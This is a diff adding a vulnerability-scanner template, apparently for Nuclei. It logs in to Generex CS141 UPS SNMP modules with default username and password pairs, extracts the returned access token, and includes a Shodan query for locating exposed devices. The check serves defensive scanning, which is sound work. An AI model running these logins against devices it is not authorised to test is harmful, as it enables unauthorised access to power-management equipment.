@@ -1,0 +1,66 @@
+id: cs141-default-login
+
+info:
+  name: UPS Adapter CS141 SNMP Module Default Login
+  author: socketz
+  severity: medium
+  description: UPS Adapter CS141 SNMP Module default login credentials were discovered.
+  reference:
+    - https://www.generex.de/media/pages/packages/documents/manuals/f65348d5b6-1628841637/manual_CS141_en.pdf
+  classification:
+    cwe-id: CWE-798
+    cpe: cpe:2.3:h:generex:cs141:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 3
+    shodan-query: http.html:"CS141"
+    product: cs141
+    vendor: generex
+  tags: hiawatha,iot,default-login
+
+http:
+  - raw:
+      - |
+        POST /api/login HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/plain, */*
+        Content-Type: application/json
+
+        {"userName":"{{user}}","password":"{{pass}}"}
+
+    attack: pitchfork
+    payloads:
+      user:
+        - admin
+        - engineer
+        - guest
+      pass:
+        - cs141-snmp
+        - engineer
+        - guest
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - 'accessToken'
+          - 'application/json'
+        condition: and
+        part: header
+
+      - type: word
+        part: body
+        words:
+          - 'accessToken'
+          - 'AdminFirstTime'
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: kval
+        kval:
+          - accessToken
+# digest: 4b0a00483046022100d9036edddf2ace7957725ebcff5efc93611eededf4613a3a79fb8c3ba0a4de4d0221008a125b8141e2d252ee9b69c9d4ac3c5809aacc6a2192fe069e3fe439392bccbd:922c64590222798bb761d5b6d8e72950
